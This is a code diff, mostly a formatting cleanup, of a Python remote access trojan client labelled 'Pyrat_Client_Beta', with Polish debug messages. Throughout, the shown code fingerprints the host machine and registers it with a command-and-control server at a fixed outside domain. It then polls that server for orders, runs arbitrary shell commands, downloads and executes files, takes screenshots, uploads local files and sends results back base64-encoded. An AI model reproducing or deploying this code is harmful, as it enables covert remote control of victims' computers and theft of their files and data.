@@ -21,6 +21,7 @@ from tkinter import messagebox
 import base64
 import time
 
+
 """
 
 Code below detect basic client parameters.
@@ -28,20 +29,24 @@ All is from stackoverflow - this is not my invention.
 
 """
 
+
 det_mac = ''.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2))
 det_os = (platform.system() + platform.release())
 det_name = os.environ['COMPUTERNAME']
-det_int_ip =[l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
+det_int_ip = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1],
+                         [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in
+                           [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
 det_ext_ip = requests.get('https://api.ipify.org').text
 
 my_headers = requests.utils.default_headers()
 my_headers.update({
-        'User-Agent' : 'Pyrat_Client_Beta',
+        'User-Agent': 'Pyrat_Client_Beta',
     })
 s = requests.Session()
 
 home_host = 'http://uw471.mikr.us'
 #home_host = 'http://127.0.0.1:8000'
+
 
 """
 
@@ -51,17 +56,19 @@ this will be made by server side.
 
 """
 
+
 def register_at_db():
 
     payload = {
-        'det_mac' : det_mac,
-        'det_os' : det_os,
-        'det_name' : det_name,
-        'det_int_ip' : det_int_ip,
-        'det_ext_ip' : det_ext_ip,
+        'det_mac': det_mac,
+        'det_os': det_os,
+        'det_name': det_name,
+        'det_int_ip': det_int_ip,
+        'det_ext_ip': det_ext_ip,
     }
-    say_hello = s.post(home_host+'/register/', data = payload, headers = my_headers)
+    say_hello = s.post(home_host+'/register/', data=payload, headers=my_headers)
     print(say_hello.text)
+
 
 """
 
@@ -71,17 +78,19 @@ Really, only for training with encoding.
 
 """
 
+
 def send_result(result, last_activity, det_mac, uniqueid):
     encoded_result = (re.search('b\'(.*)\'', str(base64.b64encode(str(result).encode()))).group(1))
     payload = {
-        'result' : ('%s' % (encoded_result)),
-        'last_activity' : last_activity,
-        'det_mac' : det_mac,
-        'uniqueid' : uniqueid
+        'result': ('%s' % (encoded_result)),
+        'last_activity': last_activity,
+        'det_mac': det_mac,
+        'uniqueid': uniqueid
     }
     #print(payload)
-    say_result = s.post(home_host+'/result/', data = payload, headers = my_headers)
+    say_result = s.post(home_host+'/result/', data=payload, headers=my_headers)
     #print(say_result.text)
+
 
 """
 
@@ -89,38 +98,40 @@ Ping function, which identify PC as iddle (by server side)
 
 """
 
+
 def ping(last_activity, det_mac):
     payload = {
-        'last_activity' : last_activity,
-        'det_mac' : det_mac
+        'last_activity': last_activity,
+        'det_mac': det_mac
     }
     #print(payload)
-    say_pong = s.post(home_host+'/ping/', data = payload, headers = my_headers)
+    say_pong = s.post(home_host+'/ping/', data=payload, headers=my_headers)
     #print(say_pong.text)
-    print('Pong')
+    confirmation = 'Pong'
+    return confirmation
+
 
 """
 
 Function that allows to run any command. If you want use cmd.exe, the command should be called from system32 folder.
-Obligatory-necessared is only command, arguments are optional. New list paramlist should be created, due to
+Obligatory-necessared is only command, arguments are optional. New list params_list should be created, due to
 isufficient [space] key and error during run arguments ['dirC:' instead 'dir C:'].
 
 """
 
+
 def run_command(command, *args):
     #print(args)
-    paramlist = []
+    params_list = []
     for a in args:
-        paramlist.append(a + ' ')
+        params_list.append(a + ' ')
     s = '\, '
-    s.join(paramlist)
+    s.join(params_list)
     #print(paramlist)
-    result = subprocess.run([command, paramlist], stdout = subprocess.PIPE)
+    result = subprocess.run([command, params_list], stdout=subprocess.PIPE)
     #print(result)
     print('Command executed')
     return result
-    #send_result(str(result), det_mac, uniqueid)
-    #result_filter = (re.search('stdout=b\'(.*)\'\)', str(result)).group(1)).replace('\\r\\n','\n')
 
 
 """
@@ -138,7 +149,7 @@ def downloader(url, path, *args):
     with open(path + '\\' + savefilename, 'wb') as f:
         shutil.copyfileobj(r.raw, f)
     print('Download completed.')
-    if (len(args) > 0 and args[0] == 'y'):
+    if len(args) > 0 and args[0] == 'y':
         run_command(path + '\\' + savefilename)
         confirmation = 'Downloaded, executed'
         return confirmation
@@ -146,6 +157,7 @@ def downloader(url, path, *args):
         print('Not requested to run downloaded file.')
         confirmation = 'Downloaded, not executed'
         return confirmation
+
 
 """
 
@@ -161,6 +173,7 @@ def popup(text, title):
     messagebox.showinfo(text, title)
     confirmation = 'Showed'
     return confirmation
+
 
 """
 
@@ -208,25 +221,23 @@ def screenshot():
     #run_command(sys_disk + '\\windows\\system32\\cmd.exe', '/C', app_dir + 'screenCapture.bat', app_dir + screen_name + '.jpg')
     run_command(sys_disk + '\\windows\\system32\\cmd.exe', '/C', 'cd ' + app_dir, '&&', 'screenCapture.bat', screen_name + '.jpg')
     payload = {
-        #'result' : 'None',
-        'det_mac' : det_mac
+        'det_mac': det_mac
     }
     file = {
-        'file' : open(app_dir + screen_name + '.jpg', 'rb')
+        'file': open(app_dir + screen_name + '.jpg', 'rb')
     }
     u = s.post(home_host + '/upload/', files = file, data = payload)
     print(u.text)
 
 
 def fileupload(file_path):
-
     payload = {
-        'det_mac' : det_mac
+        'det_mac': det_mac
     }
     file = {
-        'file' : open(file_path, 'rb')
+        'file': open(file_path, 'rb')
     }
-    u = s.post(home_host + '/upload/', files = file, data = payload)
+    u = s.post(home_host + '/upload/', files=file, data=payload)
     print(u.text)
     confirmation = 'Uploaded'
     return confirmation
@@ -254,8 +265,10 @@ This should prevent from duplicated command executions.
 
 """
 
+
 received_ids = []
 sended_commands = []
+
 
 """
 
@@ -283,7 +296,7 @@ If exceptions will be occured - the loop back to beginning.
 """
 
 payload = {
-        'det_mac' : det_mac
+        'det_mac': det_mac
     }
 
 while True:
@@ -292,27 +305,32 @@ while True:
         print('++++ NOWA ITERCJA, DRUKUJE LISTY ++++')
         print('Otrzymane id %s' % received_ids)
         print('Wysłane rezultaty o id %s ' % sended_commands)
-        #List of available commands
-        command_list = {'popup' : popup, 'run_command' : run_command, 'downloader' : downloader, 'screenshot' : screenshot,
-                        'upload' : fileupload}
-        bar = s.post(home_host+'/order/', data = payload)
-        print('DRUKUJE ORDER')
-        print(bar.text)
-        #Get ID from fetched url
+        # List of available commands
+        command_list = {
+            'popup': popup,
+            'run_command': run_command,
+            'downloader': downloader,
+            'screenshot': screenshot,
+            'upload': fileupload
+        }
+        bar = s.post(home_host+'/order/', data=payload)
+        #print('DRUKUJE ORDER')
+        #print(bar.text)
+        # Get ID from fetched url
         received_id = bar.text[0:6]
         print(received_id)
         #print(received_ids)
         time_curr = time.strftime('%Y-%m-%d %H:%M:%S')
-        #The pong is necessary, if ID was executed earlier, or MAC adress is not on fetched data
-        pong = (time_curr)# + ' IDLE')
-        #If command from list of commands is in fetched data, and mac adress is also on fetched data do this:
-        if ((any(command in bar.text for command in command_list)) and det_mac in bar.text):
-            #Check that command was not already executed
+        # The pong is necessary, if ID was executed earlier, or MAC adress is not on fetched data
+        pong = time_curr
+        # If command from list of commands is in fetched data, and mac adress is also on fetched data do this:
+        if any(command in bar.text for command in command_list) and det_mac in bar.text:
+            # Check that command was not already executed
             if received_id not in received_ids:
-                #Search for command in fetched data
+                # Search for command in fetched data
                 received_command = (re.search('#(.*)\(', str(bar.text)).group(1))
-                print(received_command)
-                #If command have some additional args
+                print('++++ ZNALEZIONO POLECENIE: %s ++++' % received_command)
+                # If command have some additional args
                 if '$' in bar.text:
 
                     """
@@ -322,12 +340,12 @@ while True:
                     to a single slash.
                     
                     """
-                    args_string = (re.search('\(\$(.*)\)\',', str(bar.text)).group(1)).replace('$', '').replace('\\\\', '\\')
-                    print(args_string)
-                    #Split all params in one list
+
+                    args_string = (re.search('\(\$(.*)\)\',', str(bar.text))
+                                   .group(1)).replace('$', '').replace('\\\\', '\\')
+                    # Split all params in one list
                     args_list = args_string.split(',')
-                    #print(args_list)
-                    #print(time_curr)
+                    print('++++ DODATKOWE ARGUMENTY: %s ++++' % args_list)
                     command_to_run = command_list[received_command]
                     result_from_run = command_to_run(*args_list)
                 else:
@@ -335,28 +353,29 @@ while True:
                     #print(time_curr)
                     command_to_run = command_list[received_command]
                     result_from_run = command_to_run()
-                #Add to list recived ID to further actions
+                # Add to list recived ID to further actions
                 received_ids.append(received_id)
-                #Check, that executed in a few moments command was already sended or not
+                # Check, that executed in a few moments command was already sended or not
                 if received_id not in sended_commands:
-                    print('++++ WYSYLAM REZULTAT WYKONANEGO POLECENIA %s O uniqueid %s ++++' % (received_command, received_id))
+                    print('++++ WYSYLAM REZULTAT WYKONANEGO POLECENIA %s O uniqueid %s ++++' %
+                          (received_command, received_id))
                     send_result(result_from_run, time_curr, det_mac, received_id)
                     sended_commands.append(received_id)
                 else:
-                    print('++++ ODPOWIEDŹ NA POLECENIE %s O uniqueid %s JUŻ WYSLANA ++++' % (received_command, received_id) )
+                    print('++++ ODPOWIEDŹ NA POLECENIE %s O uniqueid %s JUŻ WYSLANA ++++' %
+                          (received_command, received_id))
             else:
-                #If command was already executed - make a pong (inform CC that client is in iddle state)
-                print('++++ uniqueid %s JEST JUZ NA LISCIE, POLECENIE WCZESNIEJ WYKONANE ++++' % (received_id))
+                # If command was already executed - make a pong (inform CC that client is in iddle state)
+                print('++++ uniqueid %s JEST JUZ NA LISCIE, POLECENIE WCZESNIEJ WYKONANE ++++' % received_id)
                 print('++++ NIC NIE WYKONALEM, WYSYLAM PONG ++++')
                 # print('++++ DRUKUJE PONG ++++')
                 # print(pong)
                 ping(pong, det_mac)
         else:
-            #If there is no client MAC on list or command is unrecognized - make a pong (inform CC that client is in iddle state)
+            # If there is no client MAC on list or command is unrecognized - inform CC that client is in iddle state.
             print('++++ NIE ZNAM TAKIEGO POLECENIA ALBO NIE MA MOJEGO MAC NA LISCIE, WYSYLAM PONG ++++')
             ping(pong, det_mac)
     #If there is an exception (no connection or something) - go to the beginning of the loop
-    #else:
     except Exception as e:
         print(e)
         continue
